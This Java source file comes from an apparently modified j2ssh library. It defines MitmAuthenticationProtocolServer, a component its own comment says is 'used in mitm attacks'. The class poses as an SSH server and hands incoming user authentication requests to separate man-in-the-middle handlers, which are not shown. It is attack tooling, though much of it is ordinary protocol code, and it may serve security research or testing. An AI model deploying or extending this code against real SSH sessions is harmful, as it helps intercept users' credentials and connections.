/*
 * Created on Mar 2, 2003
 *
 */
package com.sshtools.j2ssh.authentication;

import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;

import com.sshtools.j2ssh.MitmGlue;
import com.sshtools.j2ssh.configuration.ConfigurationLoader;
import com.sshtools.j2ssh.configuration.ServerConfiguration;
import com.sshtools.j2ssh.transport.Service;
import com.sshtools.j2ssh.transport.ServiceOperationException;
import com.sshtools.j2ssh.transport.SshMessage;
import com.sshtools.j2ssh.transport.SshMessageStore;

/**
 * @author David G&uuml;mbel<br>
 * created 02 March 2003<br>
 * 
 * <code>AuthenticationProtocolServer</code> implemetation used in mitm
 * attacks. Based largely on <code>AuthenticationProtocolServer</code>
 */
public class MitmAuthenticationProtocolServer
	extends AuthenticationProtocolServer {
	private static Logger log = Logger.getLogger(MitmAuthenticationProtocolServer.class);
	private MitmGlue mg;


	private List completedAuthentications = new ArrayList();
	private Map acceptServices = new HashMap();
	private List availableAuths;
	private String serviceToStart;
	private int[] messageFilter = new int[1];
	private SshMessageStore methodMessages = new SshMessageStore();

	/**
	 * Constructor, sets local reference of MitmGlue instance  
	 * @param mg the MItmGlue instance
	 */
	public MitmAuthenticationProtocolServer(MitmGlue mg) {
		super();
		this.mg = mg;
		messageFilter[0] = SshMsgUserAuthRequest.SSH_MSG_USERAUTH_REQUEST;
		log.debug("mitm: new MitmAuthenticationProtocolServer generated");
	}
	
	/**
	 * Constructor overriding superclass', solely for debugging purposes.
	 * <b>Should never be used </b>
	 * @deprecated
	 *
	 */
	public MitmAuthenticationProtocolServer() {
		super();
		log.error("mitm: wrong constructor of MitmAuthenticationProtocolServer called!");
	}
	
	/**
	 *  Sends the SSH_USERAUTH_FAILURE message
	 *
	 *@param  success                      True if a partial success
	 *@throws  TransportProtocolException  if an error occurs in the Transport
	 *      Protocol
	 *@throws  ServiceOperationException   if a critical error occurs in the
	 *      service operation
	 */
	private void sendUserAuthFailure(boolean success)
			 throws IOException,
			ServiceOperationException {
		Iterator it = availableAuths.iterator();
		String auths = null;

		while (it.hasNext()) {
			auths = ((auths == null) ? "" : auths + ",") + (String) it.next();
		}

		SshMsgUserAuthFailure reply = new SshMsgUserAuthFailure(auths, success);
		transport.sendMessage(reply, this);
	}


	/**
	 *  Sends the SSH_USERAUTH_SUCCESS message
	 *
	 *@throws  TransportProtocolException  if an error occurs in the Transport
	 *      Protocol
	 *@throws  ServiceOperationException   if a critical error occurs in the
	 *      service operation
	 */
	private void sendUserAuthSuccess()
			 throws IOException {
		SshMsgUserAuthSuccess msg = new SshMsgUserAuthSuccess();
		Service service = (Service) acceptServices.get(serviceToStart);
		service.init(Service.ACCEPTING_SERVICE, transport, nativeSettings);
		service.start();
		transport.sendMessage(msg, this);
		stop();
	}


	protected void onMessageReceived(SshMessage msg) throws java.io.IOException {
		log.debug("mitm: MitmAuthenticationProtocolServer.onMessageRecieved(" +msg.toString() +")");
	   switch (msg.getMessageId()) {
			case SshMsgUserAuthRequest.SSH_MSG_USERAUTH_REQUEST:
			{
				onMsgUserAuthRequest((SshMsgUserAuthRequest) msg);

				break;
			}

			default:
				throw new AuthenticationProtocolException("Unregistered message received!");
	  }
	}

	
	
	
	/**
	 *  Handles the SSH_USERAUTH_REQUEST message
	 *
	 *@param  msg
	 *@throws  TransportProtocolException  if an error occurs in the Transport
	 *      Protocol
	 *@throws  ServiceOperationException   if a critical error occures in the
	 *      service operation
	 */
	private void onMsgUserAuthRequest(SshMsgUserAuthRequest msg)
			 throws IOException,
			ServiceOperationException {
		log.debug("mitm: MitmAuthenticationProtocolServer.onMsgUserAuthRequest()");
		if (msg.getMethodName().equals("none")) {
			sendUserAuthFailure(false);
		} else {
			// If the service is supported then perfrom the authentication
			if (acceptServices.containsKey(msg.getServiceName())) {
				String method = msg.getMethodName();

				if (availableAuths.contains(method)) {
					log.debug("MAprotoServer: about to crate new MAs by calling MASF.newInstance!");
					MitmAuthenticationServer auth =
							MitmAuthenticationServerFactory.newInstance(method,mg);
					serviceToStart = msg.getServiceName();
					auth.setUsername(msg.getUsername());
					
					log.debug("mitm: about to authenticate..");		
					int result = auth.authenticate(this, msg, nativeSettings);
					if(result == AuthenticationProtocolState.FAILED) {
					  sendUserAuthFailure(false);
					}
					else if(result == AuthenticationProtocolState.COMPLETE) {
					  completedAuthentications.add(auth.getMethodName());
					  ServerConfiguration sc =
							ConfigurationLoader.getServerConfiguration();
					  Iterator it = sc.getRequiredAuthentications().iterator();
					  while(it.hasNext()) {
						if(!completedAuthentications.contains(it.next())) {
						  sendUserAuthFailure(true);
						  return;
						}
					  }
					  nativeSettings.put("Username", msg.getUsername());
					  sendUserAuthSuccess();
					  log.debug("mitm: sent UserAuthSuccess");
					} else {
					  // Authentication probably returned READY as no complettion
					  // evaluation was needed
					}

				} else {
					sendUserAuthFailure(false);
				}
			} else {
				sendUserAuthFailure(false);
			}
		}
	}
	
	protected void onServiceInit(int startMode) throws java.io.IOException {
	  // Register the required messages
	  messageStore.registerMessage(SshMsgUserAuthRequest.SSH_MSG_USERAUTH_REQUEST,
			  SshMsgUserAuthRequest.class);
	  transport.addMessageStore(methodMessages);
	}

	/**
	 *  Configures the Authentication Protocol to allow authentication attempts
	 *  to start a Transport Protocol service.
	 *
	 *@param  service  The service instance to start
	 */
	public void acceptService(Service service) {
		acceptServices.put(service.getServiceName(), service);
	}
	
	protected void onServiceRequest() throws java.io.IOException {

		availableAuths = MitmAuthenticationServerFactory.getSupportedMethods();

		// Accept the service request
		sendServiceAccept();

		// Send a user auth banner if configured
		ServerConfiguration server =
				ConfigurationLoader.getServerConfiguration();

		if (server == null) {
			throw new AuthenticationProtocolException("Server configuration unavailable");
		}

		String bannerFile = server.getAuthenticationBanner();

		if (bannerFile != null) {
			if (bannerFile.length() > 0) {
				InputStream in = ConfigurationLoader.loadFile(bannerFile);

				if (in != null) {
						byte data[] = new byte[in.available()];
						in.read(data);
						in.close();

						SshMsgUserAuthBanner bannerMsg =
								new SshMsgUserAuthBanner(new String(data));
						transport.sendMessage(bannerMsg, this);

				} else {
					log.info("The banner file '" + bannerFile
							+ "' was not found");
				}
			}
		}
	  }

	

}
